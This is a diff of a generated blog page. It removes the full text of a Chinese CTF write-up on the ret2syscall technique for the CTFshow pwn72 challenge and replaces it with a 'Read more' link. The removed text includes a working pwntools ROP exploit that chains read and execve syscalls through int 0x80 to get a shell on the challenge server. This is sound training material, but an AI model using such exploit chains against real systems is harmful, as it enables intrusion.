@@ -188,7 +188,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2024-08-20 21:23:38 / Modified: 21:51:44" itemprop="dateCreated datePublished" datetime="2024-08-20T21:23:38+08:00">2024-08-20</time>
+      <time title="Created: 2024-08-20 21:23:38 / Modified: 21:57:50" itemprop="dateCreated datePublished" datetime="2024-08-20T21:23:38+08:00">2024-08-20</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -212,21 +212,14 @@
     <div class="post-body" itemprop="articleBody">
           <p>本题主要考察的<code>ret2syscall</code> 此前已经接触到了<code>ret2text</code> 、<code>ret2shellcode</code>、<code>ret2libc</code></p>
 <p>简单说一下这几个的区别：</p>
-<p><code>ret2text</code>，将返回地址覆盖为程序已有的函数地址</p>
-<p><code>ret2shellcode</code>，构造一段<code>shellcode</code>，然后让返回地址能指向这段<code>shellcode</code></p>
-<p><code>ret2libc</code> ，泄露<code>libc</code>地址，来构造函数和对应参数，从而<code>getshell</code></p>
-<p> <code>ret2syscall</code> ，预先构造好特殊寄存器的值，然后跳到<code>int 0x80</code> 中断号，来实现系统调用。 </p>
-<p>以<code>CTFshow pwn72</code>题为例：</p>
-<p>附件check一下发现是32位，没开保护。file看一下发现是静态链接。拖到IDA去分析：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+10h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;CTFshow-PWN&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;where is my system?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Emmm&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>存在栈溢出，这题考点已经提示了是<code>ret2syscall</code>。所以我们想办法去构造。<code>ctrl + s</code> 查找不到 <code>/bin/sh</code>  字符串。但是发现了<code>bss</code>段，且有写权限，可以考虑往里面写<code>/bin/sh</code> 。注意这里写的首地址，以<code>000</code>结尾。 之前有个题目是<code>mprotec</code>t函数，要求首地址是页的开始（4K），所以就以000的结尾，这里其实不用。那么我们如何去实现往BSS段写数据？显然还是可以用<code>ret2syscall</code> 去实现read函数的系统调用。然后再去实现execv函数的系统调用。所以这里是两层。所以思路就很清晰了。不过有个点需要注意下。因为涉及到两层。所以第一次调用<code>int 0x80</code> 后面一定要有<code>ret</code> 。一开始我用<code>ROPgadget --binary pwn72 --only &quot;int&quot;</code>只能搜到 <code>int 0x80</code> 。这里换一种方式去搜索：<code>ropper --file pwn72 --search &quot;int 0x80&quot;</code> ，对比如下： </p>
-<p><img src="https://img.picui.cn/free/2024/08/20/66c49e40d9cbb.png" alt="pwn72_1.png"></p>
-<p>最终的脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;pwn72&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28147</span>)</span><br><span class="line">pop_eax=<span class="number">0x080bb2c6</span></span><br><span class="line">pop_edx_ecx_ebx=<span class="number">0x0806ecb0</span></span><br><span class="line">bss=<span class="number">0x080eb000</span></span><br><span class="line">int_0x80=<span class="number">0x0806F350</span></span><br><span class="line">bin_sh=<span class="string">&quot;/bin/sh\x00&quot;</span> <span class="comment">#注意这里00截断，代表结束。不然会把换行读进去。</span></span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(pop_eax)+p32(<span class="number">0x3</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0x10</span>)+p32(bss)+p32(<span class="number">0</span>)+p32(int_0x80)</span><br><span class="line">payload+=p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss)+p32(int_0x80)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(bin_sh)  <span class="comment">#payload发送过去，先触发read函数，往bss里面写/bin/sh。然后再发送bin/sh</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意寄存器里对应的这些参数的值。</strong></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/08/20/ctfshow-pwn72/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
